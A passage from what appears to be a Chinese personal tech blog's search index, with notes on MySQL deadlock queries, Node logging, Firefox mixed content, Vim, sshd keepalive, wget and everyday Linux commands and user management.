class="headerlink" title="2. 查看正在锁的事务"></a>2. 查看正在锁的事务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM INFORMATION_SCHEMA.INNODB_LOCKS;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200719163402.png" alt=""></p><h4 id="3-查看等待锁的事务"><a href="#3-查看等待锁的事务" class="headerlink" title="3. 查看等待锁的事务"></a>3. 查看等待锁的事务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM INFORMATION_SCHEMA.INNODB_LOCK_WAITS;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200719155801.png" alt=""></p><h4 id="4-查询是否锁表"><a href="#4-查询是否锁表" class="headerlink" title="4. 查询是否锁表"></a>4. 查询是否锁表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW OPEN TABLES where In_use &gt; 0;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200719163422.png" alt=""></p><h4 id="5-查看最近死锁的日志"><a href="#5-查看最近死锁的日志" class="headerlink" title="5. 查看最近死锁的日志"></a>5. 查看最近死锁的日志</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show engine innodb status</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200719170929.png" alt=""></p><p>在发生死锁时，这几种方式都可以查询到和当前死锁相关的信息。</p><h3 id="解除死锁"><a href="#解除死锁" class="headerlink" title="解除死锁"></a>解除死锁</h3><p>如果需要解除死锁，有一种最简单粗暴的方式，那就是找到进程id之后，直接干掉。</p><p>查看当前正在进行中的进程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show processlist</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 也可以使用</span><br><span class="line">SELECT * FROM information_schema.INNODB_TRX;</span><br></pre></td></tr></table></figure><p>上面两个命令找出来的进程id 是同一个。</p><p>杀掉进程对应的进程 id</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill id</span><br></pre></td></tr></table></figure><p>验证（kill后再看是否还有锁）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW OPEN TABLES where In_use &gt; 0;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.cnblogs.com/duanxz/p/4394641.html" target="_blank" rel="noopener">Mysql 查看表和解锁表</a></li><li><a href="https://blog.csdn.net/LJFPHP/article/details/80599352" target="_blank" rel="noopener">Mysql 死锁是什么？</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何把 Console.log 的标准输出记录到文件</title>
      <link href="/how-to-put-console-log-the-standard-output-of-is-recorded-to-a-file/"/>
      <url>/how-to-put-console-log-the-standard-output-of-is-recorded-to-a-file/</url>
      
        <content type="html"><![CDATA[<p>最近遇到了这样一个需求，在不改动之前的任何一行代码的前提下，如何把<code>console.log</code>的标准输出全部记录到文件中呢？</p><a id="more"></a><p>我是没有选择那些大名鼎鼎的日志模块，如：</p><ul><li><a href="https://github.com/winstonjs/winston" target="_blank" rel="noopener">winston</a> - A logger for just about everything.</li><li><a href="https://github.com/log4js-node/log4js-node" target="_blank" rel="noopener">log4js</a> - A port of log4js to node.js</li></ul><p>因为我的需求够简单，只需要能把日志记录到文件就行，所以使用了下面这种最简单的方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var log_file &#x3D; fs.createWriteStream(path.resolve(__dirname, &quot;.pm2&quot;) + &#39;&#x2F;debug.log&#39;, &#123;flags : &#39;w&#39;&#125;);</span><br><span class="line">var log_stdout &#x3D; process.stdout;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 重载console.log 函数</span><br><span class="line"> *&#x2F;</span><br><span class="line">console.log &#x3D; function() &#123;</span><br><span class="line">    var res &#x3D; &quot;&quot;,</span><br><span class="line">    len &#x3D; arguments.length;</span><br><span class="line">    for(var i&#x3D;0; i&lt;len; i++)&#123;</span><br><span class="line">        res +&#x3D; arguments[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_file.write(util.format(res) + &#39;\n&#39;);</span><br><span class="line">    log_stdout.write(util.format(res) + &#39;\n&#39;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://stackoverflow.com/questions/8393636/node-log-in-a-file-instead-of-the-console" target="_blank" rel="noopener">Node: log in a file instead of the console</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 一些经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决Firefox “已阻止载入混合活动内容”</title>
      <link href="/resolve-firefox-has-blocked-loading-of-mixed-active-content/"/>
      <url>/resolve-firefox-has-blocked-loading-of-mixed-active-content/</url>
      
        <content type="html"><![CDATA[<p>最近需要将项目迁移至一台新的服务器，其中涉及到多个站点的<code>http</code>与<code>https</code>之间的转换。</p><p>网站起初不能正常访问时，我没在意，以为是网络延迟（因为服务器放在国外），直到我打开控制台发现了如下异常：</p><a id="more"></a><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200718144533.png" alt="异常内容"></p><p>这时我才意识到并不是网络延迟的问题，而是项目没有配置好。</p><h2 id="什么是混合内容"><a href="#什么是混合内容" class="headerlink" title="什么是混合内容"></a>什么是混合内容</h2><blockquote><p>当用户访问使用HTTPS的页面时，他们与web服务器之间的连接是使用SSL加密的，从而保护连接不受嗅探器和中间人攻击。<br>如果HTTPS页面包括由普通明文HTTP连接加密的内容，那么连接只是被部分加密：非加密的内容可以被嗅探者入侵，并且可以被中间人攻击者修改，因此连接不再受到保护。当一个网页出现这种情况时，它被称为混合内容页面。 —— <a href="https://developer.mozilla.org/zh-CN/docs/Security/MixedContent" target="_blank" rel="noopener">MDN</a></p></blockquote><p>通俗一点解释就是：<code>https</code> 的页面中混合着<code>http</code> 的请求，而这种请求不会被浏览器正常接受的，也被称作为混合内容页面。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>既然已经明白了为什么会产生这个问题，那么要解决起来也就非常简单了。</p><h3 id="让Firefox暂时不阻止"><a href="#让Firefox暂时不阻止" class="headerlink" title="让Firefox暂时不阻止"></a>让Firefox暂时不阻止</h3><ol><li>打开新标签页，在地址栏输入 <code>about:config</code>，进入<code>FireFox</code>高级配置页面。</li><li>搜索<code>security.mixed_content.block_active_content</code>，将默认值<code>true</code>更改为<code>false</code>。</li></ol><p>这种方式仅适用于本地调试。</p><h3 id="避免在HTTPS页面中包含HTTP的内容"><a href="#避免在HTTPS页面中包含HTTP的内容" class="headerlink" title="避免在HTTPS页面中包含HTTP的内容"></a>避免在HTTPS页面中包含HTTP的内容</h3><p>更直接有效的方式应该是约定好项目中的协议，统一使用<code>https</code>或者<code>http</code>。</p><h3 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h3><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Security/MixedContent" target="_blank" rel="noopener">什么是混合内容——MDN</a></li><li><a href="https://segmentfault.com/a/1190000015722535" target="_blank" rel="noopener">https访问遇到“已阻止载入混合内容”</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 一些经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> https </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vim 安装 molokai 配色方案</title>
      <link href="/vim-install-molokai-color-scheme/"/>
      <url>/vim-install-molokai-color-scheme/</url>
      
        <content type="html"><![CDATA[<p>像<a href="https://github.com/altercation/solarized" target="_blank" rel="noopener">solarized</a>、<a href="https://github.com/morhetz/gruvbox" target="_blank" rel="noopener">gruvbox</a>、 <a href="https://github.com/tomasr/molokai" target="_blank" rel="noopener">molokai</a>、这些都是大名鼎鼎的VIM 配色方案，本文只介绍如何安装 <code>molokai</code> 。</p><a id="more"></a><p>按照顺序执行完上面的命令，即可使用最经典的配色方案了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">mkdir .vim &amp;&amp; cd .vim</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;tomasr&#x2F;molokai.git</span><br><span class="line">cp -rf molokai&#x2F;colors&#x2F; .&#x2F;colors</span><br><span class="line">echo colorscheme molokai &gt;&gt; ~&#x2F;.vimrc</span><br><span class="line">echo set t_Co&#x3D;256 &gt;&gt; ~&#x2F;.vimrc</span><br><span class="line">echo set background&#x3D;dark  &gt;&gt; ~&#x2F;.vimrc</span><br></pre></td></tr></table></figure><p>实际效果：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200718142924.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Tutorial </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
            <tag> Vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sshd_config 常用配置项</title>
      <link href="/sshd-config-common-configuration-items/"/>
      <url>/sshd-config-common-configuration-items/</url>
      
        <content type="html"><![CDATA[<p>这篇笔记用来收录那些常用的<code>sshd_config</code>配置项。</p><a id="more"></a><h3 id="保持链接"><a href="#保持链接" class="headerlink" title="保持链接"></a>保持链接</h3><p>保持客户端与服务端之间的连接保持活动状态似乎是最常见策略。</p><ul><li><code>ServerAliveInterval</code>：客户端在向服务器发送空数据包之前（等待连接保持活动状态）将等待的秒数。</li><li><code>ClientAliveInterval</code>：服务器在向客户端发送空数据包之前（等待连接保持活动状态）将等待的秒数。</li></ul><p>设置为0（默认值）将禁用这些功能，因此如果空闲时间太长，连接可能会断开。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Host myhostshortcut</span><br><span class="line">     HostName myhost.com</span><br><span class="line">     User barthelemy</span><br><span class="line">     ServerAliveInterval 60</span><br><span class="line">     ServerAliveCountMax 10</span><br></pre></td></tr></table></figure><p>这么设置的作用是：客户端将等待空闲60秒钟（<code>ServerAliveInterval</code>时间），然后向服务器发送 <code>no-op null</code>数据包，并期待响应。</p><p>如果没有响应，则它将继续尝试上述过程直到10次（ServerAliveCountMax 次数 10 * 60 = 600秒）。如果服务器仍然没有响应，则客户端将断开ssh连接。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://unix.stackexchange.com/questions/3026/what-options-serveraliveinterval-and-clientaliveinterval-in-sshd-config-exac" target="_blank" rel="noopener">如何让ssh客户端与服务端保持连接</a></li><li><a href="https://linux.die.net/man/5/sshd_config" target="_blank" rel="noopener">sshd_config 参考手册</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 命令整理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wget 使用技巧</title>
      <link href="/wget-tips/"/>
      <url>/wget-tips/</url>
      
        <content type="html"><![CDATA[<p><code>wget</code> 是一个命令行的下载工具，对于经常使用<code>Linux</code>的用户来说，真是再熟悉不过了。下面总结了一些实用的<code>wget</code>使用技巧，可能会让你更加高效地使用 <code>wget</code>。</p><a id="more"></a><h3 id="重命名"><a href="#重命名" class="headerlink" title="重命名"></a>重命名</h3><p>最常见的使用方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget http:&#x2F;&#x2F;example.com&#x2F;filename.txt</span><br></pre></td></tr></table></figure><p>wget默认会以最后一个符合 <code>/</code> 的后面的字符来对下载文件命名，对于动态链接的下载通常文件名会不正确。</p><p>如果希望对这个下载的文件进行重命名，我们可以使用参数 <code>-O</code> 来指定一个文件名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -O file.zip http:&#x2F;&#x2F;example.com&#x2F;filename.txt</span><br></pre></td></tr></table></figure><h3 id="后台下载"><a href="#后台下载" class="headerlink" title="后台下载"></a>后台下载</h3><p>当需要下载比较大的文件时，使用参数 <code>-b</code> 可以隐藏在后台进行下载：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -b http:&#x2F;&#x2F;wppkg.baidupcs.com&#x2F;issue&#x2F;netdisk&#x2F;MACguanjia&#x2F;BaiduNetdisk_mac_3.2.0.9.dmg</span><br></pre></td></tr></table></figure><p>然后可以使用以下命令查看当前的进度：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tail -f wget-log</span><br></pre></td></tr></table></figure><h3 id="下载目录"><a href="#下载目录" class="headerlink" title="下载目录"></a>下载目录</h3><p>这条命令可以下载 <a href="http://example.com" target="_blank" rel="noopener">http://example.com</a> 网站上 packages 目录中的所有文件。</p><p>参数说明：</p><ul><li><code>-r</code>：下载目录</li><li><code>-np</code>：不遍历父目录</li><li><code>-nd</code>：不在本机重新创建目录结构</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -r -np -nd http:&#x2F;&#x2F;example.com&#x2F;packages&#x2F;</span><br></pre></td></tr></table></figure><p>与上一条命令相似，但多加了一个 <code>--accept=iso</code> 选项，这指示 wget 仅下载 i386 目录中所有扩展名为 iso 的文件。你也可以指定多个扩展名，只需用逗号分隔即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -r -np -nd --accept&#x3D;iso http:&#x2F;&#x2F;example.com&#x2F;centos-5&#x2F;i386&#x2F;</span><br></pre></td></tr></table></figure><h3 id="批量下载"><a href="#批量下载" class="headerlink" title="批量下载"></a>批量下载</h3><p>此命令常用于批量下载的情形，把所有需要下载文件的地址放到 filename.txt 中，然后 wget 就会自动为你下载所有文件了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -i filename.txt</span><br></pre></td></tr></table></figure><h3 id="断点续传"><a href="#断点续传" class="headerlink" title="断点续传"></a>断点续传</h3><p>通常我们在下载大文件时，为了防止中途因为网络不稳定等因素所引起的下载失败，可以使用 <code>-c</code> 参数，作为断点续传。</p><p>好处是：如果当时下载失败了，之后再次下载该文件时，会继续上一次的下载，而不用重头下载了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -c http:&#x2F;&#x2F;example.com&#x2F;really-big-file.iso</span><br></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>该命令可用来镜像一个网站，wget 将对链接进行转换。如果网站中的图像是放在另外的站点，那么可以使用 -H 选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -m -k (-H) http:&#x2F;&#x2F;www.example.com&#x2F;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://linuxtoy.org/archives/wget-tips.html" target="_blank" rel="noopener">wget 使用技巧</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 命令整理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些实用的 Linux 命令</title>
      <link href="/some-practical-linux-commands/"/>
      <url>/some-practical-linux-commands/</url>
      
        <content type="html"><![CDATA[<p>这篇笔记的目的是用来整理那些不常用但又很实用的Linux 命令。</p><a id="more"></a><h3 id="sudo"><a href="#sudo" class="headerlink" title="sudo!!"></a>sudo!!</h3><p>有时候我们好不容易输完一长串命令，却被提示”权限不足”，如果这个时候有一个命令记住上一次的输入内容那该多好。</p><p>还真有，<code>!!</code>命令可以获取最后一次输入的命令，所以我们直接输入下面这个命令就可以了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo!!</span><br></pre></td></tr></table></figure><h3 id="nl"><a href="#nl" class="headerlink" title="nl"></a>nl</h3><p><code>nl</code> 命令类似<code>cat</code>命令，都是查看文件内容，但不同之处在于：<code>nl</code>命令会在文本内容的每一行前面，添加行号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cat test.txt</span><br><span class="line">boo</span><br><span class="line">mac</span><br><span class="line">$ nl test.txt</span><br><span class="line">1. boo</span><br><span class="line">2. mac</span><br></pre></td></tr></table></figure><h3 id="tree"><a href="#tree" class="headerlink" title="tree"></a>tree</h3><p>以树状的形式返回当前目录的文件夹结构，这个命令很好用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ tree </span><br><span class="line">.</span><br><span class="line">└── test.txt</span><br><span class="line"></span><br><span class="line">0 directories, 1 file</span><br></pre></td></tr></table></figure><h3 id="pstree"><a href="#pstree" class="headerlink" title="pstree"></a>pstree</h3><p>和<code>tree</code>类似，不过它是返回当前运行的所有进程及其相关的子进程的树状结构。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ pstree | grep php</span><br><span class="line">|-+&#x3D; 01365 boo nginx: master process &#x2F;usr&#x2F;local&#x2F;opt&#x2F;nginx&#x2F;bin&#x2F;nginx -g daemon off;</span><br><span class="line"> | \--- 01410 boo nginx: worker process</span><br><span class="line"> | |     \--- 73098 boo grep --color&#x3D;auto nginx</span><br></pre></td></tr></table></figure><h3 id="lt-空格-gt-命令"><a href="#lt-空格-gt-命令" class="headerlink" title="&lt;空格&gt; 命令"></a>&lt;空格&gt; 命令</h3><p>这是一个有趣的命令，总所周知，用户在终端上键入的每一个命令都会被记录到<code>history</code>中，那么有没有一个命令可以骗过<code>history</code>，而不被记入呢？答案是有的。</p><p>在终端，只需要在键入命令之前输入一个或多个空格，这样你的命令就不会被记录了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ hisotry</span><br><span class="line">8874  pstree | grep nginx</span><br><span class="line">$  date</span><br><span class="line">2020年 5月18日 星期一 21时09分03秒 CST</span><br><span class="line">$ history</span><br><span class="line">8874  pstree | grep nginx</span><br></pre></td></tr></table></figure><h3 id="一些其他命令"><a href="#一些其他命令" class="headerlink" title="一些其他命令"></a>一些其他命令</h3><p>查看系统信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ uname -a</span><br></pre></td></tr></table></figure><p>查看当前日期</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ date</span><br></pre></td></tr></table></figure><p>立即关机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ shutdown -h now</span><br></pre></td></tr></table></figure><p>重新启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ reboot</span><br></pre></td></tr></table></figure><p>输出文件类型信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file test.txt</span><br><span class="line">test.txt: ASCII text</span><br></pre></td></tr></table></figure><p>在终端中进行简单的算数运算</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ expr 1 + 3</span><br><span class="line">4</span><br></pre></td></tr></table></figure><p>重命名文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ mv fileA.txt fileB.txt</span><br><span class="line">$ ls</span><br><span class="line">fileB.txt</span><br></pre></td></tr></table></figure><p>nohup 是一个 <code>POSIX</code> 命令，用于忽略 <code>SIGHUP</code> 。 SIGHUP信号是終端注销时所发送至程序的一个信号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohub php script.php</span><br></pre></td></tr></table></figure><p>type 命令用来显示指定命令的类型，判断给出的指令是内部指令还是外部指令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">type -a php</span><br><span class="line">php is &#x2F;usr&#x2F;local&#x2F;bin&#x2F;php</span><br><span class="line">php is &#x2F;usr&#x2F;bin&#x2F;php</span><br></pre></td></tr></table></figure><p>命令类型：</p><ul><li>alias：别名。</li><li>keyword：关键字，Shell保留字。</li><li>function：函数，Shell函数。</li><li>builtin：内建命令，Shell内建命令。</li><li>file：文件，磁盘文件，外部命令。</li><li>unfound：没有找到。</li></ul><p>查找进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep php</span><br></pre></td></tr></table></figure><p>注意：每个操作系统的ps版本略有不同，Ubuntu 和Mac 上可以直接使用<code>-aux</code>参数，但可能其他系统不能加破折号。<br>参考链接：<a href="https://www.computerhope.com/unix/ups.htm" target="_blank" rel="noopener">Linux ps command help and example</a></p><p>杀死进程</p><ol><li>根据 <code>pid</code>（会杀死指定pid 的进程）</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -9 [pid]</span><br></pre></td></tr></table></figure><ol start="2"><li>根据进程名称（会杀死一组同名进程）</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">killall php</span><br></pre></td></tr></table></figure><h3 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h3><p>这个命令特别实用，可以用来查看域名解析情况。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">dig aikang.me +nostats +nocomments +nocmd</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; aikang.me +nostats +nocomments +nocmd</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;aikang.me.INA</span><br><span class="line">aikang.me.3581INA185.199.108.153</span><br><span class="line">aikang.me.3581INA185.199.110.153</span><br><span class="line">aikang.me.3581INA185.199.111.153</span><br><span class="line">aikang.me.3581INA185.199.109.153</span><br><span class="line">aikang.me.3581INNSns12.domaincontrol.com.</span><br><span class="line">aikang.me.3581INNSns11.domaincontrol.com.</span><br><span class="line">ns12.domaincontrol.com.59833INA173.201.73.6</span><br><span class="line">ns11.domaincontrol.com.92984INA97.74.105.6</span><br><span class="line">ns12.domaincontrol.com.146699INAAAA2603:5:2290::6</span><br><span class="line">ns11.domaincontrol.com.92042INAAAA2603:5:2190::6</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.csdn.net/zhu_xun/article/details/17018799" target="_blank" rel="noopener">鲜为人知而又实用的 Linux 命令</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 命令整理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 添加用户以及权限分配</title>
      <link href="/linux-add-users-and-assign-permissions/"/>
      <url>/linux-add-users-and-assign-permissions/</url>
      
        <content type="html"><![CDATA[<p>写这篇笔记的目的是：在 Linux 下经常为用户的权限问题而头疼，要么是权限不足，要么是权限太大，导致结果往往不是自己想要的。</p><p>另外还有一个促使我写这篇笔记的原因就是：之前在 本地的 Ubuntu 上，竟然把用户玩坏了… 为了避免这种事情在服务器上发生，还是得深入研究下这一块。</p><a id="more"></a><h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><p>在 Linux 上，添加用户有两种方式：<code>useradd</code>和<code>adduser</code>，其区别就是：</p><ul><li>useradd 是一个Linux 命令，它提供很多参数给用户根据自己的需要进行设置。</li><li>adduser 则是一个perl 脚本，在使用时通过简单的人机交互界面，供用户进行个性设置。</li></ul><h3 id="adduser"><a href="#adduser" class="headerlink" title="adduser"></a>adduser</h3><p>相比 useradd，adduser的使用要简单很多。</p><p>使用adduser 添加一个用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ adduser boo</span><br></pre></td></tr></table></figure><p>然后根据提示填写相应的内容，需要注意的是，该命令会自动的在 <code>/home</code> 目录下创建一个与用户同名的目录。</p><p>用 adduser 这个命令创建的账号是系统账号，可以用来登录到 ubuntu系统。</p><h3 id="useradd"><a href="#useradd" class="headerlink" title="useradd"></a>useradd</h3><p>useradd 命令有大量的参数供我们进行个性设置，常用参数如下：</p><ul><li>-d&lt;登入目录&gt;：指定用户登入时的启始目录，并赋予用户对该目录的的完全控制权</li><li>-g&lt;群组&gt;：指定用户所属的群组；</li><li>-G&lt;群组&gt;：指定用户所属的附加群组；</li><li>-m：在 /home 目录下自动建立用户的登入目录；</li><li>-r：建立系统帐号；</li><li>-s<shell>：指定用户登入后所使用的shell；</li><li>-u<uid>：指定用户的 id</li></ul><p>使用 useradd 创建用户的一般步骤如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ useradd -m boo -s &#x2F;bin&#x2F;bash</span><br><span class="line">$ passwd boo</span><br><span class="line">$ ls &#x2F;home&#x2F;</span><br><span class="line">boo</span><br></pre></td></tr></table></figure><p>其中要注意的有：</p><ol><li>useradd 命令如果不带任何参数（useradd boo），表示只是创建一个用户，既没有 /home 目录下的同名文件夹，也没有设置密码，但是可以在 /etc/passwd 文件的最后一行看到刚才添加的用户。</li><li>useradd <del>这个命令创建的是普通账号，并不能用来登录系统</del>。加上参数<code>-r</code>，将该用户加入到系统用户，系统用户为 id在 1000以下的用户，而普通用户则是id 在 1000以上。事实证明 无论是普通用户还是系统用户 只要密码输入正确都能登入系统。</li><li>当使用参数<code>-m</code>的时候，系统会自动地在 /home 目录下建立一个与新建用户同名的用户主文件夹；如果不使用<code>-m</code>的话，那么就默认是使用<code>-M</code>参数，不创建主文件夹，即使你使用了<code>-d</code>这个参数。所以如果想要自己选择主文件夹，需要同时加上<code>-m</code>和<code>-d</code>参数。</li><li>误区：很都时候刚拿到一台新的机器，会发现用户目录下只有一个当前用户的文件夹，不要误以为该系统只有你一个用户，是因为很多系统用户的主目录并不在 /home 下。</li></ol><h2 id="权限分配"><a href="#权限分配" class="headerlink" title="权限分配"></a>权限分配</h2><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>无论是使用 adduser 还是 useradd 创建的用户，都试着执行一下以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 